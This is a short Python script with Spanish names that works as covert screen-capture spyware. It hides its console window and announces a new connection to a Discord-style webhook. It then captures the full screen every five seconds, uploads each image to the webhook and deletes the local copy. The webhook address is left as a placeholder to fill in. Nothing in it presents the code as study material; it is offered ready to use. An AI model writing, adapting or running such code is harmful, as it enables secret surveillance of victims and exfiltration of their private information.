import requests
import os
import json
import time
from PIL import ImageGrab
import win32console
import win32gui

ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana, 0)

wbhk = "Introducir aquí el WEBHOOK"
ftim = "imagen.png"

def wb_ctd():

    contenido_embed = {
        'embeds': [
         {
             'title': '☑️ | Conectado con exito.',
               'footer': {
                   'text': 'Cada mensaje es una nueva conexión.'
              }
           }
      ]
    }

    mensaje_webhook_embed = requests.post(wbhk, data=json.dumps(contenido_embed), headers={'Content-Type': 'application/json'})

def webhook_imagen():
    imagen = ImageGrab.grab()
    imagen.save("imagen.png")

def envio(wbhk, ftim):
    while True:
        try:
            webhook_imagen()
            with open(ftim, "rb") as f:
                image_data = f.read()

            response = requests.post(wbhk, files={"file": ("imagen.png", image_data)})
            os.remove(ftim)
            time.sleep(5)
        except Exception as e:
            quit()

wb_ctd()
envio(wbhk, ftim)